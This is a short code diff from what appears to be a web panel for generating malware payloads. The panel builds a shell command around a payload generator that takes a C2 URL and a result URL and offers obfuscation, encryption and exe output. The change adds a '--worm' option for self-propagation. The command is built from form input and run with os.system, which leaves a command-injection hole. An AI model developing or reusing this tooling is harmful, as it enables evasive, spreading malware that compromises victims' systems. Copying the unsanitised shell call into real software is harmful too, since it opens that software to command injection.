@@ -272,13 +272,18 @@ def generate():
 
         os.makedirs(os.path.dirname(out_path), exist_ok=True)
 
+        # Start building the command
         cmd = f"python3 ../tools/generate_payload.py --c2 {c2url} --result {resulturl} --output {out_path}"
+
+        # Optional flags
         if ext == 'exe':
             cmd += " --exe"
         if 'obfuscate' in request.form:
             cmd += " --obfuscate"
         if 'encrypt' in request.form:
             cmd += " --encrypt"
+        if 'worm' in request.form:
+            cmd += " --worm"
 
         print(f"[+] Running: {cmd}")
         os.system(cmd)
